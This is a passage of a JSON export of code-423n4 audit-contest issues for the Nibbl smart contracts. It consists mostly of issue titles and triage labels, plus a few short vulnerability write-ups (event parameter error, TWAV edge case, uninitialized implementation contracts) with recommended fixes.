"Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/256", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/255", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/252", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": " `_updateTwav()` and `_getTwav()` will revert when cumulativePrice overflows", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/246", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": " `_updateTwav()` and `_getTwav()` will revert when cumulativePrice overflows"}, {"title": "use of transfer instead of call() to send eth", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/245", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "use of transfer instead of call() to send eth"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/242", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/241", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/240", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/239", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/238", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/237", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/236", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/234", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/230", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/229", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/228", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/227", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/225", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/224", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/221", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/220", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/217", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/215", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/214", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/213", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/212", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/210", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/209", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/205", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/204", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/202", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "User Could Change The State Of The System While In `Pause` Mode", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/200", "labels": ["bug", "2 (Med Risk)"], "target": "2022-06-nibbl-findings", "body": "User Could Change The State Of The System While In `Pause` Mode"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/196", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Ineffective TWAV Implementation", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/191", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2022-06-nibbl-findings", "body": "Ineffective TWAV Implementation"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/187", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/186", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Reentrancy bug in Basket's withdraw multiple tokens function which gives attacker ability to transfer basket ownership and spend it but withdraw all the tokens out of basket", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/185", "labels": ["bug", "2 (Med Risk)", "sponsor disputed"], "target": "2022-06-nibbl-findings", "body": "Reentrancy bug in Basket's withdraw multiple tokens function which gives attacker ability to transfer basket ownership and spend it but withdraw all the tokens out of basket"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/183", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/182", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/181", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/180", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "`Twav.sol#_getTwav()` will revert when timestamp > 4294967296", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/178", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "`Twav.sol#_getTwav()` will revert when timestamp > 4294967296"}, {"title": "withdrawETH() in Basket uses transfer() to send ETH, CALL() SHOULD BE USED INSTEAD OF TRANSFER() ON AN ADDRESS PAYABLE", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/174", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "withdrawETH() in Basket uses transfer() to send ETH, CALL() SHOULD BE USED INSTEAD OF TRANSFER() ON AN ADDRESS PAYABLE"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/172", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/171", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/170", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/167", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/164", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/162", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "NibblVault: BuyoutInitiated event parameter error", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/160", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L414-L417   # Vulnerability details  ## Impact In the initiateBuyout function of the NibblVault contract, the second parameter of the BuyoutInitiated event is _buyoutBid instead of _currentValuation, and since the excess Ether in _buyoutBid is transferred to the user, the actual buyout price for the user is the _currentValuation variable. The user can use a large amount of Ether to get a large _buyoutBid variable, however the actual amount of Ether spent by the user is _currentValuation. Events emitted by the smart contract are used off-chain, and incorrect event parameters may have an impact on the user's trading behavior  ## Proof of Concept https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L414-L417 ## Tools Used None ## Recommended Mitigation Steps ``` -       emit BuyoutInitiated(msg.sender, _buyoutBid); +      emit BuyoutInitiated(msg.sender, _currentValuation); ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/158", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/157", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/156", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/155", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/154", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/153", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/152", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/151", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/149", "labels": ["bug", "documentation", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/147", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/142", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/141", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/140", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/139", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "USERS CAN IRREVERSIBLY LOSE ETHER WHILE SWAPPING", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/133", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "USERS CAN IRREVERSIBLY LOSE ETHER WHILE SWAPPING"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/130", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/125", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Call() Should Be Used Instead of Transfer()", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/124", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-06-nibbl-findings", "body": "Call() Should Be Used Instead of Transfer()"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/123", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/122", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/120", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/119", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Permanent freezing of funds", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/117", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-06-nibbl-findings", "body": "Permanent freezing of funds"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/116", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/114", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/113", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Twav._getTwav() will return a wrong result when twavObservations[TWAV_BLOCK_NUMBERS - 1].timestamp = 0.", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/112", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L36   # Vulnerability details  ## Impact The \"if\" condition of Twav._getTwav() is missing some edge cases. In this case, this function will return 0 which is different from the correct value and it will affect the main functions like NibblVault.buy() and NibblVault.sell().  ## Proof of Concept I think this condition is to confirm at least 4 values were saved for twav calculation. Btw this timestamp would be zero even though there are more than 4 values properly as it's modularized by 2**32. In this case, the if condition will be false and this function will return 0.  ## Tools Used Solidity Visual Developer of VSCode  ## Recommended Mitigation Steps I see \"cumulativeValuation\" is increasing all the time and recommend replacing \"timestamp\" with \"cumulativeValuation\". ``` if (twavObservations[TWAV_BLOCK_NUMBERS - 1].cumulativeValuation != 0) { ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/109", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/101", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/100", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/99", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/98", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/96", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/95", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/93", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Avoid leaving a contract uninitialized", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/91", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L173 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L23 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L158 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L99   # Vulnerability details  ## Impact In OpenZeppelin Contracts (proxy/utils/Initializable.sol): > CAUTION: An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation...   ## Proof of Concept This can lead to takeover of 2 contracts: `Basket.sol` and `NibblVault.sol` since implementation contracts not initialized and can be initialized publicly. https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol   Also, Upgrading either of their implementation in `NibblVaultFactory.sol` when  `proposeNewVaultImplementation(address _newVaultImplementation)` or `proposeNewBasketImplementation(address _newBasketImplementation)` can lead to the same issue if the upgraded contract did not disable initializers. https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L158 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L99    ## Recommended Mitigation Steps As its mentioned in OpenZeppelin Contracts documentation:  >To prevent the implementation contract from being used, you should invoke the {_disableInitializers} function in the constructor to automatically lock it when it is deployed:   ``` /// @custom:oz-upgrades-unsafe-allow constructor     constructor() {         _disableInitializers();     } ```  Should both of `Basket.sol` and `NibbleVault.sol` use the `_disableInitializers();` which make the implementation contract unable to be initialized to version 1. Hence, for newer version of `Basket.sol` and `NibbleVault.sol` proposed for the factory should also be initialized to version 1 to prevent the attack https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L165 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L130  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/90", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "ETH accumulated by underlying ERC721 in vault from royalties or airdrops are paid out to fictionalized ERC20 holders", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/88", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "ETH accumulated by underlying ERC721 in vault from royalties or airdrops are paid out to fictionalized ERC20 holders"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/87", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/84", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/83", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/82", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/81", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/80", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/79", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/78", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/75", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/74", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/70", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/69", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/60", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/59", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/58", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Buyout cannot be rejected when paused", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/55", "labels": ["bug", "2 (Med Risk)", "sponsor disputed"], "target": "2022-06-nibbl-findings", "body": "Buyout cannot be rejected when paused"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/53", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/52", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/51", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/41", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/40", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/34", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/33", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/32", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "Gas Optimizations"}, {"title": "Receive function in Vault contracts can cause loss of funds", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/26", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-06-nibbl-findings", "body": "Receive function in Vault contracts can cause loss of funds"}, {"title": "ERC20 return values 